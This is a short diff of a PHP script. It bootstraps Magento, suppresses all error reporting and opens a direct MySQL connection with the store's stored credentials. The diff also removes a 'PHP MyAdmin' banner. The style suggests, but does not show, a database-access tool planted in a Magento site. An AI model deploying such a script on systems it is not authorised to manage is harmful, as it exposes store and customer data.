@@ -1,4 +1,4 @@
- 
+
 <?php
 @session_start();
 @error_reporting(0);
@@ -31,7 +31,7 @@
 			   $app = Mage::app('default');
 			   Mage::getSingleton('core/session', array('name'=>'frontend'));
 		   }catch(Exception $e) { echo 'Message: ' .$e->getMessage()."<br/>\n";}
-		echo'<div align="center">============================[    PHP MyAdmin    ]============================<br><br>';
+
 		   if (!mysql_connect($connection->host, $connection->username, $connection->password)){
 			   print("Could not connect: " . mysql_error());
 		   }
